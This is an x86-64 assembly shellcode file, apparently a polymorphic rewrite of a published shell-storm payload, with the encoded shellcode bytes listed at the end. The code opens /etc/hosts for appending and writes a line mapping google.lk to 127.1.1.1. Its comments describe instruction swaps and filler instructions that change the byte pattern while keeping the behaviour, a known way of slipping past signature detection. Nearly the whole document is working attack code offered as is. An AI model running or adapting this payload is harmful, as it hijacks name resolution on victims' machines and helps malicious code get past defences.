
; David @InfinitelyManic
; original code http://shell-storm.org/shellcode/files/shellcode-896.php
global _start
    section .text

_start:
    ;open
;    xor rax, rax 
    ;add rax, 2  ; open syscall
	push byte 2		; symantically equiv 
	pop rax
;    xor rdi, rdi
	xor edi, edi		; opcode reduction

;    xor rsi, rsi
	xor esi, esi		; opcode reduction
    push rsi ; 0x00 
    mov r8, 0x2f2f2f2f6374652f ; stsoh/
    mov r10, 0x7374736f682f2f2f ; /cte/
    push r10
    push r8
    add rdi, rsp
    ;xor rsi, rsi
;    add si, 0x401
	push 1			; symatically equiv
	add word [rsp], 0x411	
	pop rsi			
	sub rsi, 0x10		

    syscall

    ;write
    xchg rax, rdi		; fd
;    xor rax, rax
 ;   add rax, 1 ; syscall for write
	push byte 1		; symatically equiv
	pop rax			
    jmp data

write:
    pop rsi 
    mov dl, 19 ; length in rdx
    syscall

	xchg r10, rbp		; nop equiv
	dec r10			

    ;close
;    xor rax, rax
;    add rax, 3
	push byte 3		; symantically equiv
	pop rax			
    syscall

    ;exit
;    xor rax, rax
 ;   mov al, 60
	push byte 60		; symatically equiv 
	pop rax			
 ;   xor rdi, rdi
	xor edi, esi		; opcode reduction
	
    syscall 

data:
    call write
    text db '127.1.1.1 google.lk'


; shellcode
; \x6a\x02\x58\x31\xff\x31\xf6\x56\x49\xb8\x2f\x65\x74\x63\x2f\x2f\x2f\x2f\x49\xba\x2f\x2f\x2f\x68\x6f\x73\x74\x73\x41\x52\x41\x50\x48\x01\xe7\x6a\x01\x66\x81\x04\x24\x11\x04\x5e\x48\x83\xee\x10\x0f\x05\x48\x97\x6a\x01\x58\xeb\x17\x5e\xb2\x13\x0f\x05\x4c\x87\xd5\x49\xff\xca\x6a\x03\x58\x0f\x05\x6a\x3c\x58\x31\xf7\x0f\x05\xe8\xe4\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x6c\x6b
